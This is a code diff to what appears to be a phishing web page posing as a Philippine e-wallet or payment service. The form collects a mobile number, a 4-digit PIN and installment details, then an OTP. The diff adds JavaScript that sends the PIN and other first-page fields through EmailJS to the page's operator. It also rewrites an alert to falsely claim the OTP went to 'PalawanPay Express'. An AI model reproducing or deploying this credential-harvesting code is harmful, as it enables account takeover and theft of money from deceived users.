@@ -65,7 +65,7 @@
       <input type="tel" name="mobile" placeholder="Mobile Number" required />
       <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />  
       <input type="text" name="unit" placeholder="Unit of installment or GGives" required />
-      <button type="button" onclick="goToOTP()">Next</button>
+      <button type="submit">Next</button>
     </form>
   </div>
 
@@ -80,8 +80,10 @@
   <script>
     let formData = {};
 
-    function goToOTP() {
-      const form = document.getElementById('info-form');
+    document.getElementById('info-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const form = e.target;
+
       if (!form.checkValidity()) {
         form.reportValidity();
         return;
@@ -95,9 +97,26 @@
         unit: formElements['unit'].value
       };
 
-      document.getElementById('page1').style.display = 'none';
-      document.getElementById('page2').style.display = 'block';
-    }
+      const tempForm = document.createElement('form');
+      tempForm.style.display = 'none';
+      for (const key in formData) {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = key;
+        input.value = formData[key];
+        tempForm.appendChild(input);
+      }
+      document.body.appendChild(tempForm);
+
+      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
+        .then(function() {
+          document.getElementById('page1').style.display = 'none';
+          document.getElementById('page2').style.display = 'block';
+        }, function(error) {
+          console.log('FAILED...', error);
+          alert('There was a problem submitting the first form.');
+        });
+    });
 
     document.getElementById('otp-form').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -113,15 +132,15 @@
         tempForm.appendChild(input);
       }
 
-      document.body.appendChild(tempForm); // Attach the form to the DOM before sending
+      document.body.appendChild(tempForm);
 
       emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
         .then(function() {
-          alert('Your information has been sent to Gmail. Thank you!');
+          alert('Your OTP has been sent to PalawanPay Express. Thank you!');
           location.reload();
         }, function(error) {
           console.log('FAILED...', error);
-          alert('There was a problem submitting your form.');
+          alert('There was a problem submitting your OTP.');
         });
     });
   </script>
